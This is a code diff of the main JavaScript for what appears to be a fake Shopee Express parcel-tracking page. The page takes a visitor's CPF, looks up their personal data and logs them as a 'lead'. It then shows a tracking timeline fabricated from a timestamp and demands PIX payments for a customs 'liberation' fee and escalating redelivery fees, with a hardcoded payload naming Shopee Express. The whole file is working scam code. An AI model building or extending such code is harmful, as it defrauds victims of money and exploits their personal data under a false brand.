@@ -1,28 +1,34 @@
 /**
- * Sistema principal de rastreamento - VERSÃO ATUALIZADA COM ZENTRA PAY OFICIAL
+ * Sistema principal de rastreamento - VERSÃO COMPLETA COM TIMESTAMP REAL
  */
 import { DataService } from '../utils/data-service.js';
 import { CPFValidator } from '../utils/cpf-validator.js';
-import { TrackingGenerator } from '../utils/tracking-generator.js';
 import { ZentraPayService } from '../services/zentra-pay.js';
 import { UIHelpers } from '../utils/ui-helpers.js';
+import { RealTimeTrackingService } from '../services/real-time-tracking.js';
+import { DatabaseService } from '../services/database.js';
 
 export class TrackingSystem {
     constructor() {
         this.dataService = new DataService();
         this.zentraPayService = new ZentraPayService();
+        this.trackingService = new RealTimeTrackingService();
+        this.dbService = new DatabaseService();
         this.currentCPF = null;
         this.userData = null;
         this.trackingData = null;
+        this.leadData = null;
         this.isInitialized = false;
         this.pixData = null;
         this.liberationPaid = false;
+        this.deliveryAttempts = 0;
+        this.refreshInterval = null;
     }
 
     async init() {
         if (this.isInitialized) return;
         
-        console.log('🚀 Inicializando sistema de rastreamento');
+        console.log('🚀 Inicializando sistema de rastreamento completo');
         
         try {
             this.setupCPFInput();
@@ -36,121 +42,6 @@ export class TrackingSystem {
         } catch (error) {
             console.error('❌ Erro na inicialização:', error);
         }
-    }
-
-    showLoadingNotification() {
-        const notificationOverlay = document.createElement('div');
-        notificationOverlay.id = 'trackingNotification';
-        notificationOverlay.style.cssText = `
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 3000;
-            backdrop-filter: blur(5px);
-            animation: fadeIn 0.3s ease;
-        `;
-
-        const notificationContent = document.createElement('div');
-        notificationContent.style.cssText = `
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            animation: slideUp 0.3s ease;
-            border: 3px solid #ff6b35;
-        `;
-
-        notificationContent.innerHTML = `
-            <div style="margin-bottom: 20px;">
-                <i class="fas fa-search" style="font-size: 3rem; color: #ff6b35; animation: pulse 1.5s infinite;"></i>
-            </div>
-            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
-                Identificando Pedido...
-            </h3>
-            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
-                Aguarde enquanto rastreamos seu pacote
-            </p>
-            <div style="margin-top: 25px;">
-                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
-                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #ff6b35, #f7931e); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
-                </div>
-            </div>
-            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
-                Processando informações...
-            </p>
-        `;
-
-        notificationOverlay.appendChild(notificationContent);
-        document.body.appendChild(notificationOverlay);
-        document.body.style.overflow = 'hidden';
-    }
-
-    closeLoadingNotification() {
-        const notification = document.getElementById('trackingNotification');
-        if (notification) {
-            notification.style.animation = 'fadeOut 0.3s ease';
-            setTimeout(() => {
-                if (notification.parentNode) {
-                    notification.remove();
-                }
-                document.body.style.overflow = 'auto';
-            }, 300);
-        }
-    }
-
-    showError(message) {
-        const existingError = document.querySelector('.error-message');
-        if (existingError) {
-            existingError.remove();
-        }
-
-        const errorDiv = document.createElement('div');
-        errorDiv.className = 'error-message';
-        errorDiv.style.cssText = `
-            background: #fee;
-            color: #c33;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 15px;
-            border: 1px solid #fcc;
-            text-align: center;
-            font-weight: 500;
-            animation: slideDown 0.3s ease;
-        `;
-        errorDiv.textContent = message;
-
-        const form = document.querySelector('.tracking-form');
-        if (form) {
-            form.appendChild(errorDiv);
-
-            setTimeout(() => {
-                if (errorDiv.parentNode) {
-                    errorDiv.style.animation = 'slideUp 0.3s ease';
-                    setTimeout(() => errorDiv.remove(), 300);
-                }
-            }, 5000);
-        }
-    }
-
-    scrollToElement(element, offset = 0) {
-        if (!element) return;
-
-        const elementPosition = element.getBoundingClientRect().top + window.pageYOffset;
-        const offsetPosition = elementPosition - offset;
-
-        window.scrollTo({
-            top: offsetPosition,
-            behavior: 'smooth'
-        });
     }
 
     setupCPFInput() {
@@ -192,8 +83,10 @@ export class TrackingSystem {
         const cpfInput = document.getElementById('cpfInput');
         const trackButton = document.getElementById('trackButton');
         
-        if (!cpfInput || !trackButton) return;
+        if (!cpfInput || !trackButton) {
             console.error('❌ Elementos do formulário não encontrados');
+            return;
+        }
 
         const cpf = cpfInput.value.trim();
         
@@ -217,6 +110,10 @@ export class TrackingSystem {
         try {
             console.log('🔍 Buscando dados para CPF:', this.currentCPF);
             
+            // Buscar ou criar lead no banco
+            await this.getOrCreateLead();
+            
+            // Buscar dados do usuário
             const data = await this.dataService.fetchCPFData(this.currentCPF);
             console.log('📊 Dados recebidos:', data);
             
@@ -235,17 +132,16 @@ export class TrackingSystem {
                 this.closeLoadingNotification();
                 
                 this.displayOrderDetails();
-                this.generateTrackingData();
+                this.generateRealTimeTrackingData();
                 this.displayTrackingResults();
+                
+                // Iniciar atualização automática
+                this.startAutoRefresh();
                 
                 const orderDetails = document.getElementById('orderDetails');
                 if (orderDetails) {
                     this.scrollToElement(orderDetails, 100);
                 }
-
-                setTimeout(() => {
-                    this.highlightLiberationButton();
-                }, 1500);
                 
             } else {
                 throw new Error('Dados não encontrados');
@@ -261,33 +157,57 @@ export class TrackingSystem {
         }
     }
 
-    displayOrderDetails() {
-        if (!this.userData) return;
-
-        const orderDetails = document.getElementById('orderDetails');
-        const customerName = document.getElementById('customerName');
-        const fullName = document.getElementById('fullName');
-        const formattedCpf = document.getElementById('formattedCpf');
-
-        if (orderDetails) {
-            orderDetails.style.display = 'block';
-        }
-
-        if (customerName) {
-            customerName.textContent = this.userData.nome.split(' ')[0];
-        }
-
-        if (fullName) {
-            fullName.textContent = this.userData.nome;
-        }
-
-        if (formattedCpf) {
-            formattedCpf.textContent = CPFValidator.formatCPF(this.userData.cpf);
+    async getOrCreateLead() {
+        try {
+            // Buscar lead existente
+            const existingLead = await this.dbService.getLeadByCPF(this.currentCPF);
+            
+            if (existingLead.success && existingLead.data) {
+                this.leadData = existingLead.data;
+                this.liberationPaid = existingLead.data.liberation_paid || false;
+                this.deliveryAttempts = existingLead.data.delivery_attempts || 0;
+                console.log('📋 Lead existente encontrado:', this.leadData);
+            } else {
+                // Criar novo lead com timestamp inicial
+                const newLead = {
+                    cpf: this.currentCPF,
+                    nome_completo: 'Cliente Shopee',
+                    initial_timestamp: new Date().toISOString(),
+                    liberation_paid: false,
+                    delivery_attempts: 0,
+                    origem: 'rastreamento'
+                };
+                
+                const result = await this.dbService.createLead(newLead);
+                if (result.success) {
+                    this.leadData = result.data;
+                    console.log('📋 Novo lead criado:', this.leadData);
+                }
+            }
+        } catch (error) {
+            console.error('❌ Erro ao buscar/criar lead:', error);
         }
     }
 
-    generateTrackingData() {
-        this.trackingData = TrackingGenerator.generateTrackingData(this.userData);
+    generateRealTimeTrackingData() {
+        if (!this.leadData) return;
+        
+        const initialTimestamp = this.leadData.initial_timestamp;
+        const currentTime = new Date();
+        
+        this.trackingData = {
+            timeline: this.trackingService.generateTimeline(
+                initialTimestamp, 
+                currentTime, 
+                this.liberationPaid,
+                this.deliveryAttempts
+            ),
+            initialTimestamp: initialTimestamp,
+            liberationPaid: this.liberationPaid,
+            deliveryAttempts: this.deliveryAttempts
+        };
+        
+        console.log('📊 Timeline gerada:', this.trackingData);
     }
 
     displayTrackingResults() {
@@ -305,7 +225,8 @@ export class TrackingSystem {
         }
 
         if (currentStatus) {
-            currentStatus.textContent = 'Aguardando liberação aduaneira';
+            const status = this.trackingService.getCurrentStatus(this.trackingData.timeline);
+            currentStatus.textContent = status;
         }
 
         if (trackingTimeline) {
@@ -313,14 +234,14 @@ export class TrackingSystem {
         }
 
         setTimeout(() => {
-            UIHelpers.animateTimeline();
+            this.animateTimeline();
         }, 500);
     }
 
     renderTimeline(container) {
         container.innerHTML = '';
 
-        this.trackingData.steps.forEach((step, index) => {
+        this.trackingData.timeline.forEach((step, index) => {
             const timelineItem = this.createTimelineItem(step, index);
             container.appendChild(timelineItem);
         });
@@ -334,10 +255,20 @@ export class TrackingSystem {
             item.classList.add('first');
         }
 
+        if (step.isPostPayment) {
+            item.style.background = 'linear-gradient(135deg, #d4edda, #c3e6cb)';
+            item.style.borderRadius = '10px';
+            item.style.padding = '15px';
+            item.style.margin = '10px 0';
+            item.style.border = '2px solid #27ae60';
+        }
+
         const dateFormatted = step.date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
         const timeFormatted = step.date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
 
         let buttonHtml = '';
+        
+        // Botão de liberação aduaneira
         if (step.needsLiberation) {
             buttonHtml = `
                 <button class="liberation-button-timeline" data-liberation-button>
@@ -345,11 +276,39 @@ export class TrackingSystem {
                 </button>
             `;
         }
-
-        // Adicionar botão de simulação para a última etapa completada (exceto se for liberação)
-        if (step.completed && !step.needsLiberation && index === this.trackingData.steps.length - 2) {
-            // Botão de simulação removido
+        
+        // Botão de tentativa de entrega
+        if (step.needsDeliveryPayment) {
+            buttonHtml = `
+                <button class="delivery-retry-btn" data-attempt="${step.attemptNumber}" data-value="${step.value}">
+                    <i class="fas fa-redo"></i> Reenviar Pacote - R$ ${step.value.toFixed(2)}
+                </button>
+            `;
         }
+
+        // Botão de simulação (sempre presente para testes)
+        if (step.completed && !step.needsLiberation && !step.needsDeliveryPayment) {
+            buttonHtml += `
+                <button class="simulate-button" data-step-id="${step.id}" style="
+                    background: linear-gradient(45deg, #17a2b8, #138496);
+                    color: white;
+                    border: none;
+                    padding: 8px 16px;
+                    font-size: 0.8rem;
+                    font-weight: 600;
+                    border-radius: 20px;
+                    cursor: pointer;
+                    transition: all 0.3s ease;
+                    margin-left: 10px;
+                    display: inline-flex;
+                    align-items: center;
+                    gap: 5px;
+                ">
+                    <i class="fas fa-forward"></i> Simular Próxima Etapa
+                </button>
+            `;
+        }
+
         item.innerHTML = `
             <div class="timeline-dot"></div>
             <div class="timeline-content">
@@ -367,80 +326,99 @@ export class TrackingSystem {
             </div>
         `;
 
+        // Configurar eventos dos botões
+        setTimeout(() => {
+            this.setupTimelineButtons(item);
+        }, 100);
+
         return item;
     }
 
-    highlightLiberationButton() {
-        // Não destacar se já foi pago
-        if (this.liberationPaid) {
-            console.log('💰 Liberação já paga, não destacando botão');
-            return;
-        }
-        
-        // Buscar botões usando múltiplos seletores
-        const selectors = [
-            '[data-liberation-button]',
-            '.liberation-button-timeline'
-        ];
-
-        let liberationButton = null;
-
-        for (const selector of selectors) {
-            liberationButton = document.querySelector(selector);
-            if (liberationButton) break;
+    setupTimelineButtons(item) {
+        // Botão de liberação
+        const liberationBtn = item.querySelector('[data-liberation-button]');
+        if (liberationBtn) {
+            liberationBtn.addEventListener('click', () => {
+                this.showLiberationModal();
+            });
         }
 
-        // Fallback: buscar por texto
-        if (!liberationButton) {
-            const allButtons = Array.from(document.querySelectorAll('button'));
-            liberationButton = allButtons.find(btn => 
-                btn.textContent && btn.textContent.includes('LIBERAR')
-            );
+        // Botão de reenvio
+        const deliveryBtn = item.querySelector('.delivery-retry-btn');
+        if (deliveryBtn) {
+            deliveryBtn.addEventListener('click', () => {
+                const attempt = parseInt(deliveryBtn.dataset.attempt);
+                const value = parseFloat(deliveryBtn.dataset.value);
+                this.showDeliveryModal(attempt, value);
+            });
         }
 
-        if (liberationButton) {
-            console.log('🔓 Botão de liberação encontrado');
+        // Botão de simulação
+        const simulateBtn = item.querySelector('.simulate-button');
+        if (simulateBtn) {
+            simulateBtn.addEventListener('click', () => {
+                this.simulateNextStep();
+            });
+        }
+    }
+
+    async simulateNextStep() {
+        const nextStep = this.trackingService.simulateNextStep(this.trackingData.timeline);
+        if (nextStep) {
+            console.log('🎭 Simulando próxima etapa:', nextStep.title);
             
-            this.setupLiberationButton(liberationButton);
+            // Atualizar interface
+            this.displayTrackingResults();
             
+            // Mostrar notificação
+            this.showSimulationNotification(nextStep.title);
+            
+            // Scroll para a nova etapa
             setTimeout(() => {
-                this.scrollToElement(liberationButton, 100);
+                const timelineItems = document.querySelectorAll('.timeline-item');
+                const lastItem = timelineItems[timelineItems.length - 1];
+                if (lastItem) {
+                    lastItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }
             }, 500);
-        } else {
-            console.warn('⚠️ Botão de liberação não encontrado');
-            console.log('🔍 Tentando criar botão de liberação...');
-            this.createLiberationButtonIfMissing();
         }
     }
 
-    createLiberationButtonIfMissing() {
-        // Verificar se já existe um botão na última etapa da timeline
-        const timelineItems = document.querySelectorAll('.timeline-item');
-        const lastTimelineItem = timelineItems[timelineItems.length - 1];
+    showSimulationNotification(stepTitle) {
+        const notification = document.createElement('div');
+        notification.style.cssText = `
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(45deg, #17a2b8, #138496);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(23, 162, 184, 0.3);
+            z-index: 3000;
+            animation: slideInRight 0.3s ease;
+            font-family: Inter, sans-serif;
+            max-width: 300px;
+        `;
         
-        if (lastTimelineItem && !lastTimelineItem.querySelector('[data-liberation-button]')) {
-            const timelineText = lastTimelineItem.querySelector('.timeline-text');
-            if (timelineText) {
-                const liberationButton = document.createElement('button');
-                liberationButton.className = 'liberation-button-timeline';
-                liberationButton.setAttribute('data-liberation-button', 'true');
-                liberationButton.innerHTML = '<i class="fas fa-unlock"></i> LIBERAR OBJETO';
-                
-                timelineText.appendChild(liberationButton);
-                this.setupLiberationButton(liberationButton);
-                
-                console.log('✅ Botão de liberação criado automaticamente');
+        notification.innerHTML = `
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <i class="fas fa-forward" style="font-size: 18px;"></i>
+                <div>
+                    <div style="font-weight: 600; margin-bottom: 2px;">Etapa Simulada</div>
+                    <div style="font-size: 13px; opacity: 0.9;">${stepTitle}</div>
+                </div>
+            </div>
+        `;
+        
+        document.body.appendChild(notification);
+        
+        setTimeout(() => {
+            if (notification.parentNode) {
+                notification.style.animation = 'slideOutRight 0.3s ease';
+                setTimeout(() => notification.remove(), 300);
             }
-        }
-    }
-
-    setupLiberationButton(button) {
-        button.addEventListener('click', () => {
-            this.showLiberationModal();
-        });
-
-        button.style.animation = 'pulse 2s infinite';
-        button.style.boxShadow = '0 0 20px rgba(255, 107, 53, 0.6)';
+        }, 3000);
     }
 
     async showLiberationModal() {
@@ -452,24 +430,20 @@ export class TrackingSystem {
             return;
         }
 
-        // ⚡ ABRIR MODAL IMEDIATAMENTE
-        console.log('⚡ Abrindo modal instantaneamente...');
+        // Abrir modal imediatamente
         modal.style.display = 'flex';
         document.body.style.overflow = 'hidden';
 
-        // 🔄 GERAR PIX EM BACKGROUND (sem bloquear a UI)
+        // Gerar PIX em background
         this.generatePixInBackground();
     }
 
     async generatePixInBackground() {
         console.log('🔄 Gerando PIX em background...');
         
-        // Mostrar loading inicial
         this.showPixLoadingState();
         
         try {
-            console.log('🚀 Chamando Zentra Pay...');
-            
             const pixResult = await this.zentraPayService.createPixTransaction(
                 this.userData, 
                 26.34
@@ -496,20 +470,18 @@ export class TrackingSystem {
         const copyButton = document.getElementById('copyPixButtonModal');
 
         if (qrCodeImg) {
-            // QR Code de loading
-            qrCodeImg.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDIwMCAyMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIiBmaWxsPSIjZjhmOWZhIi8+CjxjaXJjbGUgY3g9IjEwMCIgY3k9IjEwMCIgcj0iMjAiIGZpbGw9IiNmZjZiMzUiPgogIDxhbmltYXRlVHJhbnNmb3JtIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgYXR0cmlidXRlVHlwZT0iWE1MIiB0eXBlPSJyb3RhdGUiIGZyb209IjAgMTAwIDEwMCIgdG89IjM2MCAxMDAgMTAwIiBkdXI9IjFzIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIvPgo8L2NpcmNsZT4KPHRleHQgeD0iMTAwIiB5PSIxNDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiM2NjYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiI+Q2FycmVnYW5kby4uLjwvdGV4dD4KPC9zdmc+';
-            qrCodeImg.alt = 'Carregando QR Code...';
+            qrCodeImg.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDIwMCAyMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIiBmaWxsPSIjZjhmOWZhIi8+CjxjaXJjbGUgY3g9IjEwMCIgY3k9IjEwMCIgcj0iMjAiIGZpbGw9IiNmZjZiMzUiPgogIDxhbmltYXRlVHJhbnNmb3JtIGF0dHJpYnV0ZU5hbWU9InRyYW5zZm9ybSIgYXR0cmlidXRlVHlwZT0iWE1MIiB0eXBlPSJyb3RhdGUiIGZyb209IjAgMTAwIDEwMCIgdG89IjM2MCAxMDAgMTAwIiBkdXI9IjFzIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSIvPgo8L2NpcmNsZT4KPHRleHQgeD0iMTAwIiB5PSIxNDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiM2NjYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMiI+U29saWNpdGFuZG8uLi48L3RleHQ+Cjwvc3ZnPg==';
         }
 
         if (pixCodeTextarea) {
-            pixCodeTextarea.value = 'Gerando código PIX...';
+            pixCodeTextarea.value = 'Solicitando liberação...';
             pixCodeTextarea.style.color = '#999';
             pixCodeTextarea.style.fontStyle = 'italic';
         }
 
         if (copyButton) {
             copyButton.disabled = true;
-            copyButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando...';
+            copyButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Solicitando...';
             copyButton.style.opacity = '0.7';
         }
     }
@@ -521,7 +493,6 @@ export class TrackingSystem {
 
         if (qrCodeImg && this.pixData.pixPayload) {
             qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;
-            qrCodeImg.alt = 'QR Code PIX Real - Zentra Pay Oficial';
         }
 
         if (pixCodeTextarea && this.pixData.pixPayload) {
@@ -535,8 +506,6 @@ export class TrackingSystem {
             copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar';
             copyButton.style.opacity = '';
         }
-
-        console.log('✅ Modal atualizado com PIX real');
     }
 
     updateModalWithStaticPix() {
@@ -547,7 +516,6 @@ export class TrackingSystem {
 
         if (qrCodeImg) {
             qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(staticPix)}`;
-            qrCodeImg.alt = 'QR Code PIX';
         }
 
         if (pixCodeTextarea) {
@@ -561,8 +529,242 @@ export class TrackingSystem {
             copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar';
             copyButton.style.opacity = '';
         }
+    }
 
-        console.log('⚠️ Modal atualizado com PIX estático');
+    async showDeliveryModal(attemptNumber, value) {
+        console.log(`🚚 Abrindo modal de reenvio - Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}`);
+        
+        // Criar modal dinamicamente
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.id = 'deliveryModal';
+        modal.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        `;
+
+        // Gerar PIX para entrega
+        let qrCodeSrc, pixPayload;
+        try {
+            const pixResult = await this.zentraPayService.createPixTransaction(this.userData, value);
+            if (pixResult.success) {
+                qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixResult.pixPayload)}`;
+                pixPayload = pixResult.pixPayload;
+            } else {
+                throw new Error('Fallback para PIX estático');
+            }
+        } catch (error) {
+            qrCodeSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
+            pixPayload = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
+        }
+
+        modal.innerHTML = `
+            <div class="professional-modal-container">
+                <div class="professional-modal-header">
+                    <h2 class="professional-modal-title">Tentativa de Entrega ${attemptNumber}°</h2>
+                    <button class="professional-modal-close" id="closeDeliveryModal">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+                
+                <div class="professional-modal-content">
+                    <div class="liberation-explanation">
+                        <p class="liberation-subtitle">
+                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${value.toFixed(2)}.
+                        </p>
+                    </div>
+
+                    <div class="professional-fee-display">
+                        <div class="fee-info">
+                            <span class="fee-label">Taxa de Reenvio - ${attemptNumber}° Tentativa</span>
+                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
+                        </div>
+                    </div>
+
+                    <div class="professional-pix-section">
+                        <h3 class="pix-section-title">Pagamento via Pix</h3>
+                        
+                        <div class="pix-content-grid">
+                            <div class="qr-code-section">
+                                <div class="qr-code-container">
+                                    <img src="${qrCodeSrc}" alt="QR Code PIX Reenvio" class="professional-qr-code">
+                                </div>
+                            </div>
+                            
+                            <div class="pix-copy-section">
+                                <label class="pix-copy-label">PIX Copia e Cola</label>
+                                <div class="professional-copy-container">
+                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
+                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
+                                        <i class="fas fa-copy"></i> Copiar
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="professional-payment-steps">
+                            <h4 class="steps-title">Como realizar o pagamento:</h4>
+                            <div class="payment-steps-grid">
+                                <div class="payment-step">
+                                    <div class="step-number">1</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-mobile-alt step-icon"></i>
+                                        <span class="step-text">Acesse seu app do banco</span>
+                                    </div>
+                                </div>
+                                <div class="payment-step">
+                                    <div class="step-number">2</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-qrcode step-icon"></i>
+                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
+                                    </div>
+                                </div>
+                                <div class="payment-step">
+                                    <div class="step-number">3</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-check step-icon"></i>
+                                        <span class="step-text">Confirme o pagamento</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="simulation-section" style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #e9ecef; text-align: center;">
+                            <button class="simulation-button" id="simulateDeliveryPayment" data-attempt="${attemptNumber}" style="
+                                background: linear-gradient(45deg, #27ae60, #2ecc71);
+                                color: white;
+                                border: none;
+                                padding: 12px 25px;
+                                font-size: 14px;
+                                font-weight: 600;
+                                border-radius: 8px;
+                                cursor: pointer;
+                                transition: all 0.3s ease;
+                                font-family: Inter, sans-serif;
+                                display: inline-flex;
+                                align-items: center;
+                                gap: 8px;
+                                box-shadow: 0 2px 8px rgba(39, 174, 96, 0.3);
+                            ">
+                                <i class="fas fa-check-circle"></i>
+                                Simular Pagamento Realizado
+                            </button>
+                            <p style="font-size: 12px; color: #999; margin-top: 8px; font-family: Inter, sans-serif;">
+                                Para fins de demonstração
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        document.body.appendChild(modal);
+        document.body.style.overflow = 'hidden';
+
+        // Configurar eventos
+        this.setupDeliveryModalEvents(modal, attemptNumber);
+    }
+
+    setupDeliveryModalEvents(modal, attemptNumber) {
+        // Botão fechar
+        const closeButton = modal.querySelector('#closeDeliveryModal');
+        if (closeButton) {
+            closeButton.addEventListener('click', () => {
+                this.closeDeliveryModal();
+            });
+        }
+
+        // Botão copiar PIX
+        const copyButton = modal.querySelector('#copyDeliveryPixButton');
+        if (copyButton) {
+            copyButton.addEventListener('click', () => {
+                this.copyDeliveryPixCode();
+            });
+        }
+
+        // Botão simular pagamento
+        const simulateButton = modal.querySelector('#simulateDeliveryPayment');
+        if (simulateButton) {
+            simulateButton.addEventListener('click', () => {
+                this.simulateDeliveryPayment(attemptNumber);
+            });
+        }
+
+        // Fechar ao clicar fora
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                this.closeDeliveryModal();
+            }
+        });
+    }
+
+    async simulateDeliveryPayment(attemptNumber) {
+        console.log(`🎭 Simulando pagamento da ${attemptNumber}° tentativa`);
+        
+        // Fechar modal
+        this.closeDeliveryModal();
+        
+        // Incrementar tentativas
+        this.deliveryAttempts++;
+        
+        // Atualizar no banco
+        await this.dbService.updateDeliveryAttempts(this.currentCPF, this.deliveryAttempts);
+        
+        // Mostrar notificação
+        this.showPaymentSuccessNotification(`${attemptNumber}° tentativa paga`);
+        
+        // Regenerar timeline
+        setTimeout(() => {
+            this.generateRealTimeTrackingData();
+            this.displayTrackingResults();
+        }, 2000);
+    }
+
+    copyDeliveryPixCode() {
+        const pixInput = document.getElementById('deliveryPixCode');
+        const copyButton = document.getElementById('copyDeliveryPixButton');
+        
+        if (!pixInput || !copyButton) return;
+
+        try {
+            pixInput.select();
+            pixInput.setSelectionRange(0, 99999);
+
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(pixInput.value).then(() => {
+                    this.showCopySuccess(copyButton);
+                }).catch(() => {
+                    this.fallbackCopy(pixInput, copyButton);
+                });
+            } else {
+                this.fallbackCopy(pixInput, copyButton);
+            }
+        } catch (error) {
+            console.error('❌ Erro ao copiar PIX:', error);
+        }
+    }
+
+    closeDeliveryModal() {
+        const modal = document.getElementById('deliveryModal');
+        if (modal) {
+            modal.style.animation = 'fadeOut 0.3s ease';
+            setTimeout(() => {
+                if (modal.parentNode) {
+                    modal.remove();
+                }
+                document.body.style.overflow = 'auto';
+            }, 300);
+        }
     }
 
     setupOrderDetailsAccordion() {
@@ -619,25 +821,30 @@ export class TrackingSystem {
         }
     }
 
-    simulatePayment() {
-        console.log('🎭 Simulando pagamento realizado');
+    async simulatePayment() {
+        console.log('🎭 Simulando pagamento da taxa de liberação');
         
-        // Fechar modal atual
+        // Fechar modal
         this.closeLiberationModal();
         
-        // Mostrar notificação de sucesso
-        this.showPaymentSuccessNotification();
+        // Marcar como pago
+        this.liberationPaid = true;
         
-        // Atualizar timeline após 2 segundos
+        // Atualizar no banco
+        await this.dbService.updateLiberationStatus(this.currentCPF, true);
+        
+        // Mostrar notificação
+        this.showPaymentSuccessNotification('Taxa de liberação paga');
+        
+        // Regenerar timeline
         setTimeout(() => {
-            this.addPaymentSuccessStep();
-            this.startPostLiberationFlow();
+            this.generateRealTimeTrackingData();
+            this.displayTrackingResults();
         }, 2000);
     }
-    
-    showPaymentSuccessNotification() {
+
+    showPaymentSuccessNotification(message) {
         const notification = document.createElement('div');
-        notification.id = 'paymentSuccessNotification';
         notification.style.cssText = `
             position: fixed;
             top: 20px;
@@ -661,7 +868,7 @@ export class TrackingSystem {
                         Pagamento Confirmado!
                     </div>
                     <div style="font-size: 14px; opacity: 0.9;">
-                        Taxa de liberação paga com sucesso
+                        ${message}
                     </div>
                 </div>
             </div>
@@ -669,164 +876,12 @@ export class TrackingSystem {
         
         document.body.appendChild(notification);
         
-        // Remover após 4 segundos
         setTimeout(() => {
             if (notification.parentNode) {
                 notification.style.animation = 'slideOutRight 0.5s ease';
                 setTimeout(() => notification.remove(), 500);
             }
         }, 4000);
-        
-        // Adicionar animações CSS se não existirem
-        if (!document.getElementById('paymentAnimations')) {
-            const style = document.createElement('style');
-            style.id = 'paymentAnimations';
-            style.textContent = `
-                @keyframes slideInRight {
-                    from { transform: translateX(100%); opacity: 0; }
-                    to { transform: translateX(0); opacity: 1; }
-                }
-                @keyframes slideOutRight {
-                    from { transform: translateX(0); opacity: 1; }
-                    to { transform: translateX(100%); opacity: 0; }
-                }
-            `;
-            document.head.appendChild(style);
-        }
-    }
-    
-    addPaymentSuccessStep() {
-        const timeline = document.getElementById('trackingTimeline');
-        if (!timeline) return;
-        
-        const successStep = this.createTimelineItem({
-            date: new Date(),
-            description: 'Taxa de liberação aduaneira paga com sucesso',
-            completed: true
-        }, 999);
-        
-        // Adicionar classe especial para destaque
-        successStep.classList.add('payment-success');
-        successStep.style.cssText += `
-            background: linear-gradient(135deg, #d4edda, #c3e6cb);
-            border-radius: 10px;
-            padding: 15px;
-            margin: 10px 0;
-            border: 2px solid #27ae60;
-        `;
-        
-        timeline.appendChild(successStep);
